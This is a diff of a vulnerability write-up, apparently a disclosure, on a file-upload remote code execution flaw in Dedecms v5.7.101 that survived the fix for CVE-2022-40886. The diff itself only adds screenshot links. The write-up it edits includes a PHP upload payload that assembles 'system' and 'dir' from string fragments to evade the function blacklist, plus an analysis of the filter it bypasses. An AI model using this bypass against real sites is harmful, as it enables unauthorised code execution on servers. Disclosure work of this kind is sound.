@@ -6,18 +6,18 @@ Since CVE-2022-40886 is not fully fixed, Dedecms still has a file upload vulnera
 
 Log in to the backend of the website.
 
-
+![RCE-1](Dedecms-v5.7.101-RCE-1.png)
 
 Upload the file hhh.php, the content of the file is as follows:
 
 ```php
 <?php $x='sys';$xx='tem';$xxx=$x.$xx;$y='di';$yy='r';$yyy=$y.$yy;$xxx($yyy) ?>
 ```
-
+![RCE-2](Dedecms-v5.7.101-RCE-2.png)
 
 Visit `hhh.php`：
 
-
+![RCE-3](Dedecms-v5.7.101-RCE-3.png)
 
 ## Vulnerability Analysis
 
@@ -25,6 +25,7 @@ In `/dede/file_manage_control.php`, the content of the file we upload will first
 
 In `CVE-2022-40886`, the POC uses `$_COOKIE` to bypass the `$cfg_disable_funs parameter` blacklist. It can be seen that in v5.7.101, `uploads/include/uploadsafe.inc.php` added the limit of `$_COOKIE`, and added some regular matching filtering.
 
+![RCE-4](Dedecms-v5.7.101-RCE-4.png)
 
 Focus on the regular matching expression added by `uploadsafe.inc.php`.
 
